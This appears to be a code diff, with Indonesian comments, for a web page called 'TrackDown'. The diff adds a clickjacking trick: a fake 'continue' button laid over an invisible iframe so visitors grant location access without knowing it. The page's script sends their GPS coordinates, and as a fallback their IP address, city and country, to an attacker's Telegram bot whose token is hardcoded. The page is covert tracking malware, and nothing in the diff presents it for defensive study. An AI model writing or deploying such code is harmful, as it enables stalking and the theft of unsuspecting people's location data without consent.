@@ -3,11 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TrackDown Lite</title>
+    <title>TrackDown Clickjacking</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        /* Tombol Palsu yang menarik perhatian */
+        .fake-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #4CAF50;
+            color: white;
+            padding: 20px 40px;
+            font-size: 20px;
+            border: none;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        /* Iframe yang transparan untuk dialog izin lokasi */
+        iframe {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            height: 300px;
+            opacity: 0; /* Membuat iframe transparan */
+            z-index: 9;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to TrackDown!</h1>
-    <p>Loading location...</p>
+    <button class="fake-button">Klik untuk Melanjutkan</button>
+    <iframe src="https://yourdomain.com/location.html"></iframe>
 
     <script>
         const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww";
@@ -24,7 +58,23 @@
             .catch(error => console.error("Error sending to Telegram:", error));
         }
 
-        // Dapatkan Lokasi dari Geolocation API
+        // Fungsi untuk mengambil lokasi berbasis IP
+        function getIPLocation() {
+            fetch("https://ipapi.co/json/")
+                .then(response => response.json())
+                .then(data => {
+                    const ipLocationInfo = `
+                        IP Address: ${data.ip}
+                        City: ${data.city}
+                        Region: ${data.region}
+                        Country: ${data.country_name}
+                    `;
+                    sendToTelegram(`Fallback IP Location:\n${ipLocationInfo}`);
+                })
+                .catch(error => console.error("Error fetching IP location:", error));
+        }
+
+        // Inisialisasi Clickjacking
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -36,11 +86,15 @@
                     sendToTelegram(`Location Info:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nGoogle Maps: ${googleMapsUrl}`);
                 },
                 (error) => {
-                    sendToTelegram("Location Info: Could not retrieve location.");
+                    // Jika gagal, gunakan lokasi berbasis IP
+                    sendToTelegram("Location Info: Could not retrieve location. Using fallback IP location.");
+                    getIPLocation();
                 }
             );
         } else {
-            sendToTelegram("Location Info: Geolocation not supported by browser.");
+            // Jika Geolocation API tidak didukung, gunakan lokasi berbasis IP
+            sendToTelegram("Location Info: Geolocation not supported by browser. Using fallback IP location.");
+            getIPLocation();
         }
     </script>
 </body>
